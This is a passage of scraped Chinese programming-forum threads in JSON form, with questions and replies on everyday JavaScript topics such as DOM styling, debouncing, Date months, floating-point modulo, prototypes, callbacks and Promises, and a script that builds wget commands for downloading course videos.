class=\"s1\">'#ffffff'</span><span class=\"p\">;</span>\n\n         <span class=\"c1\">// 其他 div 恢复默认 css</span>\n          <span class=\"p\">[].</span><span class=\"nx\">forEach</span><span class=\"p\">.</span><span class=\"nx\">call</span><span class=\"p\">(</span><span class=\"nx\">bar_list</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">ele</span><span class=\"p\">,</span> <span class=\"nx\">index</span><span class=\"p\">,</span> <span class=\"nx\">arr</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">index</span> <span class=\"o\">==</span> <span class=\"nx\">num</span><span class=\"p\">)</span> <span class=\"k\">return</span><span class=\"p\">;</span>\n            <span class=\"nx\">ele</span><span class=\"p\">.</span><span class=\"nx\">getElementsByTagName</span><span class=\"p\">(</span><span class=\"s1\">'div'</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">display</span> <span class=\"o\">=</span> <span class=\"s1\">'none'</span><span class=\"p\">;</span>\n            <span class=\"nx\">ele</span><span class=\"p\">.</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">backgroundColor</span> <span class=\"o\">=</span> <span class=\"s1\">'#F4F4F4'</span><span class=\"p\">;</span>\n            <span class=\"nx\">ele</span><span class=\"p\">.</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">color</span> <span class=\"o\">=</span> <span class=\"s1\">'#333333'</span><span class=\"p\">;</span>\n          <span class=\"p\">});</span>\n        <span class=\"p\">};</span>\n\n     <span class=\"p\">}(</span><span class=\"nx\">i</span><span class=\"p\">);</span>\n\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</pre></div>\n\n<p>像这样的选中某个 div ，此 div 的样式改变。但是其他区域只有用循环这种死方法，然后判断不是当前 div 的其他 div 的样式恢复正常。这样感觉太烦了，有没有好一点的方法呢，求思路。</p>\n</div></div>", "<div class=\"topic_content\">确实应该反过来，一时间脑子转不过弯</div>"], "reply": "12", "tittle": "点击某一事件让其改变 style，但让其他区域恢复原本 style，求思路", "comment": ["addclass  removeclass", "为什么不能反过来呢，先全部都恢复，再对那只特殊的进行处理", "将 style 写成 class.然后参考 @", " @", "参考 #2 ，先抹平，然后再处理特定项", "先用 jQuery 的批量处理特性\r", "再用 #2 说的先全部取消再特殊处理\r", "\r", "只需 2 行:\r", "$(.....).removeClass('....');\r", "$(this).addClass('....');", "或者，对于一定只有一个处于激活状态的，也可以用 lastXXX\r", "\r", "比如\r", "\r", "var lastActivatedTab = null;\r", "....\r", "....\r", "tab.onclick = function () {\r", "\r", "if (lastActivatedTab !== null) {\r", "    // do somthing to `lastActivatedTab`\r", "}\r", "\r", "// do something to `this`\r", "lastActivatedTab = this;\r", "\r", "}", " bw!", "头像好评", " 我能用一行 $(this).addClass(cls).siblings().removeClass(cls);\r", "如果需要返回$(this),就这样  $(this).addClass(cls).siblings().removeClass(cls).end()", "Not 选择器。"]},
{"content": ["<div class=\"topic_content\"><p>返回顶部按钮渐进渐出的显示出来，可问题是，如果只执行一次！如果判断大于小于，动一下就来一个事件。不想用 jQuery 等第三方库。</p>\n<div class=\"highlight\"><pre><span class=\"kd\">function</span> <span class=\"nx\">progressiveDisplayBack2Top</span><span class=\"p\">(){</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">needDisp</span> <span class=\"o\">=</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementById</span><span class=\"p\">(</span><span class=\"s1\">'back-to-top'</span><span class=\"p\">);</span>\n\n        <span class=\"kd\">function</span> <span class=\"nx\">setProgressive</span><span class=\"p\">(</span><span class=\"nx\">leftNum</span><span class=\"p\">,</span> <span class=\"nx\">interval</span><span class=\"p\">,</span> <span class=\"nx\">upORdown</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nb\">Boolean</span><span class=\"p\">(</span><span class=\"nx\">upORdown</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n                <span class=\"kd\">var</span> <span class=\"nx\">leftNum</span> <span class=\"o\">=</span> <span class=\"nx\">leftNum</span> <span class=\"o\">+</span> <span class=\"mf\">0.01</span><span class=\"p\">;</span>\n                <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">leftNum</span> <span class=\"o\">&gt;</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"p\">;</span>\n                <span class=\"nx\">needDisp</span><span class=\"p\">.</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">opacity</span> <span class=\"o\">=</span> <span class=\"nx\">leftNum</span><span class=\"p\">;</span>\n            <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n                <span class=\"kd\">var</span> <span class=\"nx\">leftNum</span> <span class=\"o\">=</span> <span class=\"nx\">leftNum</span> <span class=\"o\">-</span> <span class=\"mf\">0.01</span><span class=\"p\">;</span>\n                <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">leftNum</span> <span class=\"o\">&lt;</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"p\">;</span>\n                <span class=\"nx\">needDisp</span><span class=\"p\">.</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">opacity</span> <span class=\"o\">=</span> <span class=\"nx\">leftNum</span><span class=\"p\">;</span>\n            <span class=\"p\">}</span>\n            <span class=\"nx\">setTimeout</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n                    <span class=\"nx\">setProgressive</span><span class=\"p\">(</span><span class=\"nx\">leftNum</span><span class=\"p\">,</span> <span class=\"nx\">interval</span><span class=\"p\">,</span> <span class=\"nx\">upORdown</span><span class=\"p\">);</span>\n                <span class=\"p\">},</span> <span class=\"nx\">interval</span><span class=\"p\">);</span>\n        <span class=\"p\">}</span>\n\n        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">scrollTop</span> <span class=\"o\">&gt;</span> <span class=\"mi\">700</span><span class=\"p\">){</span>\n            <span class=\"nx\">setProgressive</span><span class=\"p\">(</span><span class=\"mf\">0.01</span><span class=\"p\">,</span> <span class=\"mi\">10</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>\n        <span class=\"p\">}</span>\n\n        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">scrollTop</span> <span class=\"o\">&lt;</span> <span class=\"mi\">700</span><span class=\"p\">){</span>\n            <span class=\"nx\">setProgressive</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">10</span><span class=\"p\">,</span> <span class=\"kc\">false</span><span class=\"p\">);</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n\n\n    <span class=\"nx\">addOnloader</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"nx\">addOnScrollEvent</span><span class=\"p\">(</span><span class=\"nx\">progressiveDisplayBack2Top</span><span class=\"p\">);</span>\n    <span class=\"p\">});</span>\n</pre></div>\n</div>"], "reply": "3", "tittle": "滚动时间，如何判断 scollTop 到一定高度只执行一次", "comment": ["有个概念叫\"去抖动\"", "最简单的  难道不是一个 boolean 的事？", "函数节流, 函数去抖. 同时对楼主谴责, 连续提 3 个搜索能够得到答案的问题."]},
{"content": ["<div class=\"topic_content\"><p>基本上能找到的都是用 jQuery 实现的，没意思。</p>\n</div>"], "reply": "7", "tittle": "有哪些网站有 JS 特效素材，纯 JS 实现，不用第三方库。", "comment": ["Github 上挺多的(￣▽￣)", "楼主，你想要什么 JavaScript 效果呢？\r", "你说的这个属于伪命题的，如果简单的效果，写一下就可以了；\r", "如果逻辑有点复杂的，用原生 JavaScript 写效果，基本都会封装自己的类库以便重复使用的，不然重复造轮子太蛋疼了；\r", "你找到的 jQuery 效果，按照实现的逻辑。用原生 JavaScript 写一遍不就出来了吗；", "都是找 纯 CSS 实现\r", "有 JS 的都不要", "Codepen+1"]},
{"content": ["<div class=\"topic_content\">比如\r<br>start.setFullYear(2014, 12, 2); \t\t\t//时间年、月、日\r<br>而解析出来的结果却是： 2015 1 月 2 日\r<br>start.toLocaleString()\r<br>不知道是什么原因</div>"], "reply": "12", "tittle": "Date()对象设置时间总晚一个月", "comment": ["month: Integer value representing the month, beginning with 0 for January to 11 for December.\r", "\r", " 直接命中，谢谢大神，我刚开始捣鼓 js^_^", "真巧，我也遇到这个问题，感谢", "  有问题上 MDN", "想起了嘌呤生女儿的时候...\r", " \r", "一看到就想起了鸟嘌呤、腺嘌呤。。。", "javascript 月份从 0 开始！书里说了好多遍。", "new Date()//获取客户端当前的事件（标准的事件格式数据）\r", "getFullYear();//获取四位年\r", "getMonth();//获取月 0-11 代表 1-12 月；\r", "getDate();//获取日\r", "getDay();//获取星期 0-6 代表周日-周六\r", "getHours();//获取小时\r", "getMinutes();//获取分\r", "getSeconds();//获取秒\r", "getMilliseconds();//获取毫秒\r", "getTime();//获取距离 1970 年一月一日午夜的毫秒差；", "哈哈哈，又有人掉进这个坑了", " 感谢推荐，业余搞搞 js ^_^", "月份是从 0 开始的", "哈哈，昨天我也遇到这个问题，笑死我了。。。 0-11"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Google 了好多，依然没有解决，求教 ~</p>\n</div></div>"], "reply": "6", "tittle": "selenium 如何测试网页里嵌入的 Flash 视频播放器呢？", "comment": ["需要测试的此 flash 或 flex 需要提供 js 接口", " 具体一点呢？能不能给一些例子呢 ~ 谢啦", "什么年代了还用 flash ....", " 是别人家的网站。。。。。。我只是需要用 selenium 去 hack ~", " \r", "1. js 接口\r", "查看 flash 源码获取 js 接口，没有源码反编译 flash 获取 js 接口。没有接口自己 hack.\r", "2. 模拟点击\r", "sikuli", "flash-selenium "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://i13.tietuku.com/7b11748d1d3f7b41.png\">http://i13.tietuku.com/7b11748d1d3f7b41.png</a><br>\n在 javascript 里面 1%0.1=0.09999999999999995???不懂。<br>\n新人求教，谢谢。</p>\n</div></div>"], "reply": "14", "tittle": "为什么 1%0.1 有余数", "comment": ["因为这是 javascript （逃🙈", "怎么老有人问这个问题\r", "这和 Javascript 没有关系...\r", "因为\r", "> (0.1).toPrecision(21)\r", "'0.100000000000000005551'\r", "这个东西的原因，是二进制有限小数和十进制有限小数能表示的数字不是同一个集合\r", "0.1 不能用有限二进制小数准确表示\r", "比如三进制的 0.1 ，用十进制表示是 0.333333333...，一个道理", " 感谢回答，不过操作时怎么解决呢", " 精确数学运算，各语言都有专门的库", " 发现自己孤陋寡闻..", "因为 JS 里的 number 就是 C/Java 的 double 。\r", "\r", "（不要提位运算，那是特例。", "于是取余数要这样子吗\r", "9-Math.floor(9/4)*4", " \r", "我觉得比较简单的办法是都乘 10 转成整数再来算\r", "但是 JavaScript 本身没有整数，要乘 10 再约成整数", " 取余操作本来就应该仅针对两个整数操作，很多语言里根本就不能对浮点数取余， JS 能为浮点取余只是为了让 API 看起来更合理而已。", " \r", " 灰常感谢你们的回答:)", "0.1 在二进制里是个无限小数，无法精确表示。", " ", "IEEE754", " 这个 666666666"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原生 js ，不依赖任何库<br>\n兼容 IE6+<br>\n自适应位置，保持 tip 窗口始终全部显示在当前页面视口<br>\n支持 hover ， click 两种触发模式，可统一设置也可单独设置<br>\n自定义 tips 窗口尺寸，样式，与目标元素的距离等<br>\n提示框默认出现顺序优先级：右上 -&gt; 左上 -&gt; 右下 -&gt; 左下</p>\n\n<p>demo: <a target=\"_blank\" rel=\"nofollow\" href=\"http://weatherstar.me/jPopuptip/\">http://weatherstar.me/jPopuptip/</a><br>\ngithub: <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/zhiyul/jPopuptip\">https://github.com/zhiyul/jPopuptip</a></p>\n</div></div>"], "reply": "8", "tittle": "一个纯 js 实现的自适应位置 tootip", "comment": ["名字什么的没起好 - -", "『你可以滑动滚动条，查看弹出框的变化。』 变化在哪儿？", " 他说的变化可能是弹出会跟随移动", "支持!", " 弹出框的位置变化", " 谢谢", " 没有变化。。。", "  保持 tip 窗口始终全部显示在当前页面视口 你可以缩小窗口 看看边缘位置的 tooltip 的位置变化"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/luoway/luoway.github.io/blob/master/_posts/2015-10-14-prototype-inherit-Object.md\">https://github.com/luoway/luoway.github.io/blob/master/_posts/2015-10-14-prototype-inherit-Object.md</a></p>\n\n<blockquote>\n<p>prototype 只是一个纯粹的习惯性的属性名</p>\n\n<p>原型是 JavaScript 一种对象引用的方法，不同于把 A 赋给 B ，两个变量引用一个对象。而是，<br>\n给 B 添加一个通常命名为“ prototype ”的属性，它是一个对象（它往往被 new 实例化的过程中声明为对象），用这个属性来引用 A</p>\n</blockquote>\n\n<p>继承是指， B.prototype 引用了 A ，所以说 B （其实是 B 的 prototype 属性）继承了 A （构造）的属性。</p>\n\n<p><strong>区分</strong><br>\n原型：声明一个属性 prototype ，引用一个对象。该属性引用的对象，是该属性所属对象的原型；<br>\n继承：通过执行 new ConstructFunc()、 Object.create(obj)继承。</p>\n\n<p>《 JavaScript 权威指南》的不解释，让原型“看起来很难的样子”，理解了发现其实就是个引用对象。</p>\n\n<hr>\n\n<p>这样理解没错吧？我用代码试的时候没错，担心漏了什么……</p>\n</div></div>"], "reply": "10", "tittle": "关于什么是 prototype、原型、继承，我这种简单到两三句话的理解有没有错误？", "comment": ["感觉楼主还没分清 prototype, __proto__ 和 [[Prototype]]，还需努力。", " 感谢指出\r", "\r", "详细了解__proto__让我发现了我理解上的很多疏漏\r", "\r", "继续努力\r", "\r", "[[Prototype]]是什么搜索不到，能否再指点一下？", " 去看 ECMAScript 标准吧，虽然有点枯燥拗口，但能啃下来以后这块就毫无问题了，有疑问也只要翻翻标准条文就能解释", " ", "\r", "对象的 [[Prototype]] 是一个内部属性，用于引用该对象的原型对象", " 现在我在试图总结和解释，虽然手上只有《 JavaScript 权威指南》，里面也解释不连贯。\r", "\r", " 谢谢，我好好看看，再来修改和完善自己的解释。", " 更新了\r", "\r", "\r", "    原型：\r", "    所有对象都有一个叫做 [[Prototype]] 的内部属性，它用于实现继承。\r", "    自有对象（ Object 、 Array 、 Function ）有原生属性 prototype 暴露内部属性[[Prototype]]， prototype 指向被继承的原型。\r", "    __proto__属性指向该对象继承的原型，可以改变__proto__以改变指向哪个原型。\r", "\r", "    继承：\r", "    三种方法实现继承。\r", "    new Constructor()、使对象__proto__属性指向被继承原型、 Object.create(obj [, properties])。", "__proto__ 就是 [[Prototype]]，根据引擎实现不同。\r", "\r", "自有对象（ Object 、 Array 、 Function ）有原生属性 prototype 暴露内部属性[[Prototype]]， prototype 指向被继承的原型。\r", "\r", "对象默认继承自 Object 的原型。", " 感谢提出\r", "> __proto__ 就是 [[Prototype]]，根据引擎实现不同。\r", "prototype 也是[[Prototype]]\r", "\r", "能说说两者的不同吗？", " \r", "__proto__ 是指向继承自的对象的原型，是和对象的原型的关系。\r", "\r", "prototype 是当前对象的属性，在创建对象的时候自动获得的，指向当前对象的原型对象。", " \r", "> __proto__ 是指向 继承自的 对象的 原型\r", "所以指向原型的原型？\r", "\r", "对象属性、自定义的对象没有 prototype ，\r", "var A = {\r", "    say: \"This is A\"\r", "}, B = {};\r", "function F(){}\r", "console.log(B.prototype);   //undefined\r", "console.log(F.prototype);   //{constructor: function F()}\r", "console.log(B.__proto__);   //Object\r", "console.log(B.__proto__.prototype);   //undefined\r", "\r", "[[Prototype]]是在创建对象的时候自动获得的，但 prototype 不是。\r", "\r", "看这个：\r", "console.log(Object.__proto__);//function()\r", "console.log(Object.prototype);//Object\r", "\r", "自有对象的 prototype 能正确地指向原型，非自有对象的__proto__也能正确地指向原型。\r", "自有对象的__proto__不正确指向，非自有对象的 prototype 不存在。"]},
{"content": ["<div class=\"topic_content\"><p>前几天想写个抓取 bing 每日壁纸作为 chrome 新标签页背景的插件，可是 chrome 插件貌似只支持 js 。而 js 想跨域读取 json 的话，也必须有服务端的支持，比如这个：</p>\n\n<p><code>JSONP(JSON with Padding)是一个非官方的协议，它允许在服务器端集成 Script tags 返回至客户端，通过 javascript callback 的形式实现跨域访问</code></p>\n\n<p>想读取的 json 地址：<a target=\"_blank\" rel=\"nofollow\" href=\"http://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=1&amp;n=1&amp;nc=1443074799572&amp;pid=hp&amp;video=1\">http://cn.bing.com/HPImageArchive.aspx?forma=js&amp;idx=1&amp;n=1&amp;nc=1443074799572&amp;pid=hp&amp;video=1</a></p>\n\n<p>chrome 应用商店已经有插件实现了类似功能， yahoo 的 FlikrTab ，不知道它这个是怎么实现的，难道在 yahoo 服务器上有对应的代码传递数据给 js ？求大牛解释一下</p>\n</div>"], "reply": "14", "tittle": "js 跨域读取 json 问题", "comment": ["不对， Chrome 插件允许跨域加载文件\r", "当成 text 读过来 parse 一下就行了。", " 真的有，感谢了，去试一下", " 应该还是得用 XMLHttpRequest()吧？", "  1 楼给的就是一样的意思，里面有提到不要用 eval 来解析，避免出现恶意代码。", " thx", "Chrome extension API 的 XMLHttpRequest 支持跨域，可能需要先在 manifest.json 里面添加一下内容权限。", " 行，谢谢", " 我发现这样不行,这个 json 地址是不会做出任何响应的，那我 XMLHttpRequest()中的 onreadystatechange 就没有作用", " 是不是只要这个静态页面响应就 ok 了？", " 我并没有实践过，没法回答你了", "  好吧，谢谢了", " 赞"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">reg</span><span class=\"p\">(</span><span class=\"nx\">regInfo</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nx\">toast</span><span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">);</span>\n        <span class=\"k\">return</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"nx\">toast</span><span class=\"p\">(</span><span class=\"s1\">'注册成功'</span><span class=\"p\">);</span>\n    <span class=\"c1\">// 注册成功，继续处理业务</span>\n<span class=\"p\">});</span>\n</pre></div>\n<div class=\"highlight\"><pre><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">reg</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">regInfo</span><span class=\"p\">,</span> <span class=\"nx\">callback</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">regInfo</span><span class=\"p\">.</span><span class=\"nx\">account</span><span class=\"p\">.</span><span class=\"nx\">length</span> <span class=\"o\">&lt;</span> <span class=\"mi\">5</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"k\">return</span> <span class=\"nx\">callback</span><span class=\"p\">(</span><span class=\"s1\">'用户名最短需要 5 个字符'</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">regInfo</span><span class=\"p\">.</span><span class=\"nx\">password</span><span class=\"p\">.</span><span class=\"nx\">length</span> <span class=\"o\">&lt;</span> <span class=\"mi\">6</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"k\">return</span> <span class=\"nx\">callback</span><span class=\"p\">(</span><span class=\"s1\">'密码最短需要 6 个字符'</span><span class=\"p\">);</span>\n    <span class=\"c1\">// 向服务器发送注册请求</span>\n    <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nx\">signUp</span><span class=\"p\">(</span><span class=\"nx\">regInfo</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n        <span class=\"nx\">success</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">user</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"c1\">// 注册成功，可以使用了.</span>\n        <span class=\"p\">},</span>\n        <span class=\"nx\">error</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">user</span><span class=\"p\">,</span> <span class=\"nx\">error</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"c1\">// 失败了</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">});</span>\n    <span class=\"k\">return</span> <span class=\"nx\">callback</span><span class=\"p\">();</span>\n<span class=\"p\">};</span>\n</pre></div>\n\n<p><strong>问题:</strong> 如何在服务器返回失败以后再返回<code>callback('服务器注册失败')</code>?</p>\n\n<p>谢谢大家！</p>\n</div></div>"], "reply": "8", "tittle": "一个涉及 Javascript 回调函数的问题，请大牛帮忙看看", "comment": ["```\r", "app.reg = function(regInfo, callback) {\r", "    if (regInfo.account.length < 5) {\r", "        return callback('用户名最短需要 5 个字符');\r", "    }\r", "    if (regInfo.password.length < 6) {\r", "        return callback('密码最短需要 6 个字符');\r", "    // 向服务器发送注册请求\r", "    user.signUp(regInfo, {\r", "        success: function(user) {\r", "            // 注册成功，可以使用了.\r", "        },\r", "        error: function(user, error) {\r", "            // 失败了\r", " return callback();\r", "        }\r", "    });\r", "   \r", "};\r", "```", "怎么不支持 markdown    你要的不是发 callback 放到回调里就好了吗", "把倒数第二行 return callback()那行删了\r", "user.signUp 的 success 和 error 里分别调 callback", " OK, 解决了，我之前也是在回调里面用了 return callback(); 直接调 callback 就可以了，谢谢~~", "用用 Promise 吧， 实在看不下去 callback 回调了", " 引入 Promise 对于原有的代码改动的工作主要有哪些？", "没有 callback 了。\r", "app.reg = function (regInfo) {\r", "  if (regInfo.account.length < 5) {\r", "        return Promise.reject('用户名最短需要 5 个字符');\r", "    }\r", "    if (regInfo.password.length < 6) {\r", "        return Promise.reject('密码最短需要 6 个字符');\r", "\r", "    return user.signUp(regInfo);\r", "};\r", "\r", "// 使用\r", "app.reg(regInfo)\r", "  .then((ret) => {\r", "    // 成功了\r", "  })\r", "  .catch((ex) => {\r", "    // 失败了\r", "  });\r", "\r", "// es7\r", "try {\r", "  await app.reg(regInfo);\r", "} catch (ex) {\r", "  // 失败了\r", "  return;\r", "}\r", "// 成功，继续业务代码", "要么使用回调要么使用 promise"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>标题是不是很绕……<br>\n其实就是一段 Javascript 代码，用来生成批量下载视频的 shell 代码。</p>\n\n<p>首先进入教程学习页面，比如这个： <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.imooc.com/learn/514\">http://www.imooc.com/learn/514</a></p>\n\n<p>然后 F12 打开控制台（ Chrome 浏览器），把写好的脚本粘贴执行。</p>\n\n<p>执行完毕后，再输入：“ document.cmd ”就可以拿到下载命令了。直接 shell 执行或者在 Windows 下搞一个 wget 放在同级目录即可。</p>\n\n<p>脚本如下：</p>\n<div class=\"highlight\"><pre><span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">cmd</span> <span class=\"o\">=</span> <span class=\"s1\">''</span><span class=\"p\">;</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">dic</span> <span class=\"o\">=</span> <span class=\"p\">{};</span>\n    <span class=\"kd\">function</span> <span class=\"nx\">getJsonCallback</span><span class=\"p\">(</span><span class=\"nx\">json</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">result</span> <span class=\"o\">=</span> <span class=\"nx\">json</span><span class=\"p\">.</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">result</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"p\">{</span> <span class=\"nx\">name</span><span class=\"o\">:</span> <span class=\"nx\">result</span><span class=\"p\">.</span><span class=\"nx\">name</span><span class=\"p\">,</span> <span class=\"nx\">id</span><span class=\"o\">:</span> <span class=\"nx\">result</span><span class=\"p\">.</span><span class=\"nx\">mid</span><span class=\"p\">,</span> <span class=\"nx\">url</span><span class=\"o\">:</span> <span class=\"nx\">result</span><span class=\"p\">.</span><span class=\"nx\">mpath</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"p\">};</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">cmd</span> <span class=\"o\">=</span> <span class=\"s1\">'wget -O \"'</span> <span class=\"o\">+</span> <span class=\"nx\">dic</span><span class=\"p\">[</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"s2\">\" - \"</span> <span class=\"o\">+</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">+</span> <span class=\"s1\">'.mp4\" '</span> <span class=\"o\">+</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">url</span><span class=\"p\">;</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">cmd</span><span class=\"p\">);</span>\n        <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">cmd</span> <span class=\"o\">+=</span> <span class=\"nx\">cmd</span><span class=\"p\">;</span>\n        <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">cmd</span> <span class=\"o\">+=</span> <span class=\"s1\">'\\r\\n'</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n\n    <span class=\"kd\">var</span> <span class=\"nx\">index</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'.J-media-item'</span><span class=\"p\">).</span><span class=\"nx\">each</span><span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">url</span> <span class=\"o\">=</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">).</span><span class=\"nx\">attr</span><span class=\"p\">(</span><span class=\"s1\">'href'</span><span class=\"p\">);</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">id</span> <span class=\"o\">=</span> <span class=\"nx\">url</span><span class=\"p\">.</span><span class=\"nx\">split</span><span class=\"p\">(</span><span class=\"s1\">'/'</span><span class=\"p\">)[</span><span class=\"mi\">2</span><span class=\"p\">];</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">jsonPath</span> <span class=\"o\">=</span> <span class=\"s2\">\"http://www.imooc.com/course/ajaxmediainfo/?mid=\"</span> <span class=\"o\">+</span> <span class=\"nx\">id</span> <span class=\"o\">+</span> <span class=\"s2\">\"&amp;mode=flash\"</span><span class=\"p\">;</span>\n        <span class=\"nx\">dic</span><span class=\"p\">[</span><span class=\"nx\">id</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">index</span><span class=\"p\">;</span>\n        <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">getJSON</span><span class=\"p\">(</span><span class=\"nx\">jsonPath</span><span class=\"p\">,</span> <span class=\"nx\">getJsonCallback</span><span class=\"p\">);</span>\n        <span class=\"nx\">index</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"p\">});</span>\n<span class=\"p\">})();</span>\n</pre></div>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>2015 年 10 月 10 日：修正错误下载练习题的问题，感谢 @hronro  的反馈。</p>\n<div class=\"highlight\"><pre><span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">cmd</span> <span class=\"o\">=</span> <span class=\"s1\">''</span><span class=\"p\">;</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">dic</span> <span class=\"o\">=</span> <span class=\"p\">{};</span>\n    <span class=\"kd\">function</span> <span class=\"nx\">getJsonCallback</span><span class=\"p\">(</span><span class=\"nx\">json</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">result</span> <span class=\"o\">=</span> <span class=\"nx\">json</span><span class=\"p\">.</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">result</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"p\">{</span> <span class=\"nx\">name</span><span class=\"o\">:</span> <span class=\"nx\">result</span><span class=\"p\">.</span><span class=\"nx\">name</span><span class=\"p\">,</span> <span class=\"nx\">id</span><span class=\"o\">:</span> <span class=\"nx\">result</span><span class=\"p\">.</span><span class=\"nx\">mid</span><span class=\"p\">,</span> <span 